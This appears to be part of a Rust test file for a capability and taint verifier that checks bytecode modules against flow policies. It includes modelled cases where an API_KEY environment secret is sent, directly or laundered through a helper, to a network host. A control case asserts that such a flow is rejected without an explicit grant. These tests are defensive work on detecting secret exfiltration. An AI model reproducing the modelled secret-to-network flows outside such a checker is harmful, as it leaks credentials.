    /// (is-odd-style). No capabilities, no taint: must verify with an empty
    /// observed-capability set.
    #[test]
    fn l1_pure_helper_chain_verifies_with_no_capabilities() {
        let module = Module {
            id: "test:l1".to_owned(),
            package: "is-odd".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![
                Function::new(
                    0,
                    "is_odd",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::CallLocal(1), // abs(n) (pure opaque transform)
                        Op::Const(Value::Int(2)),
                        Op::Mod,
                        Op::Const(Value::Int(1)),
                        Op::Eq,
                        Op::Return,
                    ],
                ),
                Function::new(1, "abs", 1, vec![Op::LoadArg(0), Op::Return]),
            ],
        };
        let report = verify_module(&module, &Policy::pure()).unwrap();
        assert!(
            report.observed_capabilities.is_empty(),
            "L1: pure helper chain must observe no capabilities, got {:?}",
            report.observed_capabilities
        );
    }

    /// L2: env secret read and sent to a network host WITH the explicit
    /// `env:X -> network:host` flow grant must verify. Control: the SAME
    /// module without the grant must reject.
    #[test]
    fn l2_secret_to_network_with_explicit_flow_grant_verifies() {
        let module = host_module(
            "test:l2",
            vec![Function::new(
                0,
                "main",
                0,
                vec![
                    Op::Cap(CapOp::EnvRead {
                        name: "API_KEY".to_owned(),
                    }),
                    Op::Cap(CapOp::HttpRequest {
                        request: omc_format::HttpRequest::post(
                            "https://api.allowed.example/ingest",
                            "api.allowed.example",
                        ),
                    }),
                    Op::Pop,
                    Op::Const(Value::Unit),
                    Op::Return,
                ],
            )],
        );
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("API_KEY".to_owned()))
            .allow_capability(Capability::HttpHost("api.allowed.example".to_owned()))
            .allow_flow(
                LabelMatcher::Env("API_KEY".to_owned()),
                Sink::Network("api.allowed.example".to_owned()),
            );
        verify_module(&module, &policy).unwrap();

        let no_flow = Policy::pure()
            .allow_capability(Capability::EnvRead("API_KEY".to_owned()))
            .allow_capability(Capability::HttpHost("api.allowed.example".to_owned()));
        let err = verify_module(&module, &no_flow).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("env:API_KEY may not flow")),
            "L2 control: without the flow grant it must reject, got {:?}",
            err.findings
        );
    }

    /// L2 interprocedural variant: the secret is laundered through a pure
    /// `CallLocal` identity helper before the granted network send. The flow
    /// grant must still admit it.
    #[test]
    fn l2_secret_through_helper_with_flow_grant_verifies() {
        let module = host_module(
            "test:l2b",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Cap(CapOp::EnvRead {
                            name: "API_KEY".to_owned(),
                        }),
                        Op::CallLocal(1), // launder through identity
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://api.allowed.example/ingest",
                                "api.allowed.example",
                            ),
                        }),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(1, "identity", 1, vec![Op::LoadArg(0), Op::Return]),
            ],
        );
        let policy = Policy::pure()
            .allow_capability(Capability::EnvRead("API_KEY".to_owned()))
            .allow_capability(Capability::HttpHost("api.allowed.example".to_owned()))
            .allow_flow(
                LabelMatcher::Env("API_KEY".to_owned()),
                Sink::Network("api.allowed.example".to_owned()),
            );
        verify_module(&module, &policy).unwrap();
    }

    /// L3: a helper that takes a PUBLIC argument and posts it to the network
    /// with only an http capability grant must verify — no flow grant needed
    /// because no sensitive label reaches the sink.
    #[test]
    fn l3_public_arg_posted_to_network_verifies_without_flow_grant() {
        let module = host_module(
            "test:l3",
            vec![
                Function::new(
                    0,
                    "main",
                    0,
                    vec![
                        Op::Const(Value::String("public-payload".to_owned())),
                        Op::CallLocal(1),
                        Op::Pop,
                        Op::Const(Value::Unit),
                        Op::Return,
                    ],
                ),
                Function::new(
                    1,
                    "post",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::Cap(CapOp::HttpRequest {
                            request: omc_format::HttpRequest::post(
                                "https://telemetry.allowed.example/e",
                                "telemetry.allowed.example",
                            ),
                        }),
                        Op::Return,
                    ],
                ),
            ],
        );
        let policy = Policy::pure()
            .allow_capability(Capability::HttpHost("telemetry.allowed.example".to_owned()));
        let report = verify_module(&module, &policy).unwrap();
        assert!(
            report
                .observed_capabilities
                .iter()
                .any(|c| matches!(c, Capability::HttpHost(h) if h == "telemetry.allowed.example")),
            "L3: expected the http capability to be observed, got {:?}",
            report.observed_capabilities
        );
    }

    /// L4: deep pure call chain (f0 -> f1 -> f2 -> f3) plus pure
    /// self-recursion must verify without spurious taint or over-rejection.
    #[test]
    fn l4_deep_pure_chain_and_recursion_verify() {
        let module = Module {
            id: "test:l4".to_owned(),
            package: "deep-pure".to_owned(),
            version: "0.0.0".to_owned(),
            declared_behavior: BehaviorType::Pure,
            functions: vec![
                Function::new(0, "f0", 1, vec![Op::LoadArg(0), Op::CallLocal(1), Op::Return]),
                Function::new(
                    1,
                    "f1",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::CallLocal(2),
                        Op::Const(Value::Int(1)),
                        Op::Add,
                        Op::Return,
                    ],
                ),
                Function::new(
                    2,
                    "f2",
                    1,
                    vec![
                        Op::LoadArg(0),
                        Op::CallLocal(3),
                        Op::Const(Value::Int(2)),
                        Op::Mul,
                        Op::Return,
                    ],
                ),
                Function::new(3, "f3", 1, vec![Op::LoadArg(0), Op::Return]),
                Function::new(
                    4,
                    "f4",
                    1,
                    vec![
                        Op::LoadArg(0),           // 0
                        Op::JmpIfFalse(5),        // 1 -> base at index 7
                        Op::LoadArg(0),           // 2
                        Op::Const(Value::Int(1)), // 3
                        Op::Sub,                  // 4
                        Op::CallLocal(4),         // 5 recurse
                        Op::Return,               // 6
                        Op::Const(Value::Int(1)), // 7 base
                        Op::Return,               // 8
                    ],
                ),
            ],
        };
        let report = verify_module(&module, &Policy::pure()).unwrap();
        assert!(
            report.observed_capabilities.is_empty(),
            "L4: deep pure chain + recursion must observe no capabilities, got {:?}",
            report.observed_capabilities
        );
    }
}
